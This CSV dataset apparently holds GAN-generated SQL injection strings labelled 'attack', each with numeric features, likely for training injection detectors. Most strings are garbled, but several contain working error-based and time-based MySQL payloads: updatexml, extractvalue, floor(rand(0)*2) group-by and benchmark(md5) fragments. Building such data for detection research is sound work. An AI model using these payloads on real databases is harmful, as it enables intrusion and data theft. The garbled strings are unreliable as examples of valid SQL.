attack,"1'  )  ,,1   thenor  4493  )    )    )   x 3931 by else DINelse when 3931 4386  (  ||al_alal_alt  113  SELECT 1210  er   then 4493  )  #2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,445,137.0,37.0,4.009915889571428,45.0,30.0,48.0,14.0,0.3284671532846715,0.21897810218978103,0.35036496350364965,0.10218978102189781,1.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,2.0,2.0,2.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"-' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'FROM"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,446,191.0,39.0,4.091132791098719,54.0,46.0,65.0,26.0,0.28272251308900526,0.24083769633507854,0.3403141361256545,0.13612565445026178,2.0,2.0,1.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,6.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%b""  =  ""5840",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,447,14.0,10.0,3.0930692077718898,1.0,5.0,4.0,4.0,0.07142857142857142,0.35714285714285715,0.2857142857142857,0.2857142857142857,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-83821  106  case when   (  case 0 AND from1   x.ss   )   x   gIT  (  ~  =  )     e   (tlt_inleanalt  =  u,  *,floor  (  0x7171706a71||chhr  0x4b774c75   then AsI.er.drrhr  (  (  select or 0cl  )   SELECT   (  =_   )     and1   then E(  ||chhr  0x7171706a716055  ,  rand  ,8190||  ||chr  (  (  SELECTthselect  t.=",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,448,313.0,49.0,4.301432463028697,120.0,47.0,107.0,39.0,0.38338658146964855,0.1501597444089457,0.34185303514376997,0.12460063897763578,0.0,0.0,1.0,0.0,1.0,4.0,0.0,14.0,0.0,2.0,4.0,14.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'||  (  select 'rxemasz.r  (  case  ,floor  4493   and ) 3931  0 || duas s whereIt_r  (  chr  (  9173  ||chr  (  =  tU,7562  ||ch  =  =  thenchr   )  6913)     --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,449,163.0,38.0,4.067914481788785,56.0,22.0,58.0,27.0,0.34355828220858897,0.13496932515337423,0.3558282208588957,0.1656441717791411,2.0,0.0,2.0,0.0,0.0,3.0,0.0,8.0,0.0,1.0,2.0,13.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,1oq'  =  'l8wheretyu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,450,20.0,15.0,3.7219280948873625,11.0,2.0,4.0,3.0,0.55,0.1,0.2,0.15,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   (  )     8877 information_schema.chr  (  (  SELECT union from  (  SELECT from   hr  rand  4232  =  )    )    )   (  )     )    )   then 7158  rand,concat  (  ||chr  (  *,1 m   (  )  ||r  )    )     from D CFROM  AND extractvaluehr  (  ||  (  113  )  (  )  select else FROMU when when(  1045  select dr  )  9067,floor  (  =  =u  )   (  (  ,0x717a767a71,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,451,361.0,51.0,4.109113511285043,137.0,35.0,142.0,47.0,0.37950138504155123,0.09695290858725762,0.39335180055401664,0.13019390581717452,0.0,1.0,0.0,0.0,1.0,3.0,0.0,29.0,0.0,1.0,5.0,10.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'ni,floor  )     )     =  casea   =  SELECTselect (  case  select 1210  (  )  )     4386 xhr  (  ||char  (  then_chr  c  (  8190   (  select 4386  0x7171706a71   x   )    )    )     4493  )  (  )   )     0 6082   )   SELECT by dt  (  ||chrow  ||chount     (  )  )   )    ,0x717a767a71,floor  6237,FROM  select where FROMxar  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,452,329.0,44.0,3.9777321392499974,109.0,49.0,133.0,38.0,0.331306990881459,0.14893617021276595,0.40425531914893614,0.11550151975683891,1.0,0.0,0.0,0.0,0.0,2.0,0.0,24.0,0.0,1.0,4.0,8.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,7.0
attack,"-106nun   )    ()    tunthhr  )  select x   then 1 d'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ' union 5192s R.x CT   andl  #a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,453,413.0,45.0,3.8908333718183394,139.0,62.0,167.0,45.0,0.3365617433414044,0.15012106537530268,0.4043583535108959,0.1089588377723971,2.0,0.0,1.0,0.0,2.0,1.0,0.0,30.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,4.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'l,SELECT  (  x  )    fromu  6825E0x717a767a71,concat  (  4386  (  )    )   ) when 6913  || from from    (  )     )    = when   select when   ||chrS  (  (  from  =  )     and    m  when  (  )   --ljex.p   (  select   (  =  )     )   from 4493 m   x.   SELECT end group or or else A  )  )   )   from concata select end  )   x   then 1  select x  )    ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,454,555.0,46.0,3.953141954906386,206.0,63.0,225.0,61.0,0.37117117117117115,0.11351351351351352,0.40540540540540543,0.10990990990990991,2.0,0.0,2.0,0.0,0.0,4.0,0.0,38.0,0.0,0.0,7.0,12.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,0.0,0.0,5.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,1'113t_r  athelt_xrosmacs.selectnualx,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,455,37.0,19.0,4.080414513985239,27.0,4.0,2.0,4.0,0.7297297297297297,0.10810810810810811,0.05405405405405406,0.10810810810810811,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%""  =  "" oruayu.achr  (  ||chr  (  =  ,  0  select 'i'  select or 9067  unionrus  )     6055  #na SELECT 1 N else  by end  rand  )   or  select   )    )     )   or 4510 or group R  select0x4b774c75 group select x INN""  =  ""  ,  )     1   )    6082dit_rthr.x.r  6270  =  (   1 1 3931 1 by 1 DIMI x when  *  having else ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456,319.0,53.0,4.261908808201993,130.0,39.0,119.0,31.0,0.40752351097178685,0.12225705329153605,0.3730407523510972,0.09717868338557993,2.0,4.0,0.0,0.0,1.0,4.0,0.0,10.0,1.0,1.0,2.0,7.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1h'ualtel_dre   (  )  0   )  ||asysnasu'  =  'utuitzz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457,53.0,22.0,3.8218912091168997,25.0,2.0,16.0,10.0,0.4716981132075472,0.03773584905660377,0.3018867924528302,0.18867924528301888,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'al_nayraxhrysu.3326  (  ||chr  (  =  case dauaanaa 2017  6825  case 0 x 3051 information_schemarxsytrtdoy.1045r  =  )  )   WHERE 1 concat  select c(  5192,1   SELECT by r    (  case from where U union 0  ,  (  ,  ||ch  (  (  rand  *(  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458,409.0,50.0,4.23999568277027,150.0,67.0,143.0,49.0,0.36674816625916873,0.16381418092909536,0.34963325183374083,0.1198044009779951,2.0,0.0,0.0,0.0,1.0,3.0,0.0,25.0,0.0,2.0,9.0,8.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,1.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1x""and group from(  select D FROM  (  0x5c  =  )     )    )  ),concat  (    )  6055  )   from xr from   (   0AND ||  (  =     a 1 AND 0 end     5305   ||chrhvhr  113  ||  (  ||""  ,hr  6825  chx  (     in,     )    )   )    bSELECT when   (  select union x  )   -- from x  t else  from  (  0  ,0x717a767a71,1   and 5584 group 1 ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459,327.0,50.0,3.997642409296785,114.0,37.0,138.0,38.0,0.3486238532110092,0.11314984709480122,0.42201834862385323,0.1162079510703364,0.0,2.0,2.0,0.0,0.0,2.0,0.0,19.0,0.0,0.0,5.0,12.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,6.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'i'  =  'ua6913",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460,194.0,29.0,3.473238863890187,42.0,39.0,85.0,28.0,0.21649484536082475,0.20103092783505155,0.4381443298969072,0.14432989690721648,4.0,0.0,0.0,0.0,0.0,2.0,0.0,16.0,1.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-'+  (  select 'or) and case >  (  (  =  )   SELECT 5584 from 1 endu,0x717a767a71ac0x7171706a710x717a767a71,7469  ||c  as  union when    )  )    select  end   floor  ))   x 1 andhr  (  =  ||  (||s U else   having group end  )       ||cs group  ||chhr  rand  (  113  3440  --5483  then m)   or     60553440  D  =  )     )   (  a R  )  ,1  )    (1 ) )   )   ,concat",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461,363.0,47.0,4.1173524279486164,122.0,59.0,135.0,47.0,0.33608815426997246,0.162534435261708,0.371900826446281,0.12947658402203857,2.0,0.0,3.0,0.0,0.0,3.0,0.0,23.0,0.0,0.0,4.0,18.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,1.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 't",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462,195.0,30.0,3.883629952429029,70.0,37.0,68.0,20.0,0.358974358974359,0.18974358974358974,0.3487179487179487,0.10256410256410256,2.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"-5967     SELECT from end   5856  case 0 or  from  (  ||chr  (  )  >  =  )   )  x,select   x whens  x  ||chr  chrhro  (  (  9891,  ||  select 6825 from  (  6825,concat  =  4493  ||chrl and_hr 122  ,  case a whenamUAS113 LINSCSNsIchros   6082  2017  (  ||chs  (  )   SELECT        when   (  =  *  ),",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463,298.0,44.0,4.193866576754042,115.0,39.0,109.0,35.0,0.3859060402684564,0.13087248322147652,0.36577181208053694,0.1174496644295302,0.0,0.0,1.0,0.0,1.0,3.0,0.0,13.0,0.0,1.0,5.0,16.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"-qHextractvaluesfer    4232  ,0x717a767a71,  )  ||  ||chr  (  ||I  (  )  ||chr  (  rand  =  )   x and from WHERE )   a      1  else 6825 when FROM  ||chhr  (  0 or 1 group DIM 3785 cNunia   (      )   then AND  ||chr  (  (  case select AL.AOSfloorc'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'r  (  =t  )  )     )  --,concat  6913   :drt_(  ""  =  ""  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464,478.0,59.0,4.12929226636234,172.0,51.0,190.0,65.0,0.3598326359832636,0.10669456066945607,0.39748953974895396,0.13598326359832635,2.0,2.0,3.0,0.0,0.0,3.0,0.0,33.0,0.0,1.0,7.0,18.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1%u""' like 'b",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465,13.0,11.0,3.3927474104487847,6.0,1.0,2.0,4.0,0.46153846153846156,0.07692307692307693,0.15384615384615385,0.3076923076923077,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-5978'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'thr  4232  ,  0x5c  ||chr  selectas m when   = 3051 DAND concat  (  #  )  x   select (  case 1 end  randal*in   )    FROM#er  (  )  *,floor  (  case =  ) x union 6   else 4493    ,1  6055  4232  )    from and x N end  )     thenI end   ue ASTINTohr  (  =  ||  (  )  ||chr  extractvalue  )  ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466,633.0,53.0,4.059957044620682,229.0,83.0,250.0,71.0,0.3617693522906793,0.13112164296998421,0.3949447077409163,0.11216429699842022,2.0,0.0,1.0,0.0,4.0,4.0,0.0,40.0,0.0,0.0,9.0,18.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,4.0,0.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"1%j%p*' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'tw  (  )  thencoutan_adal_lelt_as DINUMACnTE0x717a767a71select   x2    or else 1 union      )  ,concat  =  tina group 0 from 0 1  concat  113  ||chr  (  ||  (  (  )  ||chr  (  )  (  0  ,9173       ||hr  =  (  , =  ,0x717a767a71uzl   )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467,717.0,53.0,4.169486046816226,242.0,132.0,255.0,88.0,0.33751743375174337,0.18410041841004185,0.35564853556485354,0.12273361227336123,4.0,0.0,0.0,0.0,3.0,6.0,0.0,43.0,2.0,3.0,16.0,20.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,4.0,1.0,3.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '0x717a767a7159965840  0 )  select  else 1 else or 9067 or else  (  select end   and ddddrhr  (  6825  4232  select dextractvalue.dr.chr  (    ||chr  (  ) when  1297  ||chr  (  ||cu  (  (   )   || from concat    (  ||chr  dr  (  >  ||chr  ),1 from  )  ,hr  case m   WHERE else t group R.STw  am du    112  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468,484.0,44.0,3.995731733882427,171.0,74.0,183.0,56.0,0.35330578512396693,0.15289256198347106,0.378099173553719,0.11570247933884298,2.0,0.0,0.0,0.0,0.0,1.0,0.0,30.0,0.0,0.0,7.0,14.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"ISs' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'ndq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469,174.0,33.0,3.9165616869557853,44.0,46.0,61.0,23.0,0.25287356321839083,0.26436781609195403,0.3505747126436782,0.13218390804597702,2.0,0.0,0.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,6.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1'||  (  select 'kyLu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470,21.0,14.0,3.5537631144722455,10.0,1.0,5.0,5.0,0.47619047619047616,0.047619047619047616,0.23809523809523808,0.23809523809523808,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ''  =  'jb    ' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '1045"" like ""0x717a767a71pa.unanal_'  =  'ain  (  0  =  =  )  0  ,  (     12 from group IIT  euin  106  )    113    =,0x717a767a71concat  --i,  *1045||chr    nu2   )        (  having Q5192C group end   )    )     )   )  ,   SELECTs end    FROM when   ),Rs m   having by 2 groupGconcat  --  )      thenand h1radr    from (  select ,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471,852.0,61.0,4.046388427485341,277.0,129.0,345.0,101.0,0.32511737089201875,0.15140845070422534,0.40492957746478875,0.11854460093896714,8.0,2.0,4.0,0.0,4.0,7.0,0.0,53.0,1.0,1.0,16.0,18.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,10.0,3.0,0.0,5.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,24.0
attack,"1""0x717a767a71,floor  a  *2   )   || or x  drar  (  (    )     ) and #   )     )     ||  )  select whenl  (  =  ,concat  113  ||chr  (  u   )   a from 0  randechr   (h,then  select from 1 hr  (  rand  case   (   information_schema  )     )  ||chr  s  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472,252.0,33.0,3.674486112173297,99.0,16.0,104.0,33.0,0.39285714285714285,0.06349206349206349,0.4126984126984127,0.13095238095238096,0.0,1.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,1.0,3.0,11.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'o_zpUwu"" like ""3326",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473,213.0,38.0,4.155388824626555,79.0,41.0,70.0,23.0,0.37089201877934275,0.19248826291079812,0.3286384976525822,0.107981220657277,2.0,2.0,0.0,0.0,0.0,1.0,0.0,12.0,0.0,1.0,5.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"17469%7810%a6270havingseasys.t  (  113  R  =  *2   a    (  (  ||chr  (  =  6237,concat  0x7171706a71   (  ||chr  select  from  (     select WHERE ||'||  (  select 'hsx.s.U_WHERE 1392ads  FROM.  hchr  select12   )    )    )     from 1 d x LINT gCd.gos  )   fromx.e ) WHERE 1 xT L NNT  (  (  ||cht_sr   (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474,302.0,51.0,4.427796400568281,122.0,39.0,100.0,41.0,0.40397350993377484,0.1291390728476821,0.33112582781456956,0.1357615894039735,2.0,0.0,0.0,0.0,1.0,2.0,0.0,15.0,2.0,2.0,1.0,13.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,3.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
